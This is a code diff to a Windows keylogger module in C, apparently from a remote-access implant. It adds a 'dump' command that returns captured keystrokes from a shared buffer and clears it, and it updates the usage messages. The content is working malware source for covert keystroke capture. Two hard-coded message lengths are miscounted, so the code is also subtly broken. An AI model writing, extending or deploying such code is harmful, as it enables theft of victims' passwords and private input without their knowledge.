@@ -792,7 +792,7 @@ static DWORD WINAPI _kl_thread_func(LPVOID param) {
 
 void mod_keylogger(Buffer *out, const char *subcmd) {
     if (!subcmd || !*subcmd) {
-        buf_append(out, "Usage: keylogger start|stop", 27);
+        buf_append(out, "Usage: keylogger start|stop|dump", 31);
         return;
     }
 
@@ -884,8 +884,24 @@ void mod_keylogger(Buffer *out, const char *subcmd) {
         _kl_buf.len = 0; _kl_buf.cap = 0;
         LeaveCriticalSection(&_kl_cs);
     }
+    else if (strcmp(subcmd, "dump") == 0) {
+        if (!_kl_active) {
+            buf_append(out, "Keylogger not running", 21);
+            return;
+        }
+
+        EnterCriticalSection(&_kl_cs);
+        if (_kl_buf.data && _kl_buf.len > 0) {
+            buf_append(out, _kl_buf.data, _kl_buf.len);
+            /* Clear after dump so next dump shows only new keys */
+            _kl_buf.len = 0;
+        } else {
+            buf_append(out, "No keystrokes captured yet", 25);
+        }
+        LeaveCriticalSection(&_kl_cs);
+    }
     else {
-        buf_append(out, "Usage: keylogger start|stop", 27);
+        buf_append(out, "Usage: keylogger start|stop|dump", 31);
     }
 }
 
